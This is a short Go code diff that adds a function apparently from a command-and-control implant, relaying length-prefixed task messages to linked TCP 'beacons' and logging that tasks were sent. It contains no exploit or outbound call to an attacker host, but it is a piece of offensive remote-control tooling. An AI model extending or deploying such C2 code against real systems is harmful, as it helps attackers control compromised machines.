@@ -100,6 +100,23 @@ func CheckTcpBeacons() []byte {
 	return resultBuf
 }
 
+func SendLinkPacket(beaconId uint32, message []byte) {
+	// get the beacon link we actually want
+	for i := range config.TcpBeacons {
+    if config.TcpBeacons[i].Id == int(beaconId) {
+			// Found!
+			// we only send data, reading a response will happen the next time we check in with that beacon either way
+			beacon := config.TcpBeacons[i]
+			messageLen := WriteLittleInt(len(message))
+			fmt.Printf("Length is [%x] in current endianness, converted will be [%x]\n", len(message), messageLen)
+			beacon.Conn.Write(messageLen)
+			time.Sleep(50 * time.Millisecond)
+			beacon.Conn.Write(message)
+			fmt.Printf("Sent tasks to beacon %d\n", beacon.Id)
+    }
+}
+}
+
 func CheckSliceNull(b []byte) bool {
 	nullSlice := []byte{00, 00, 00, 00}
 	for i, v := range b {
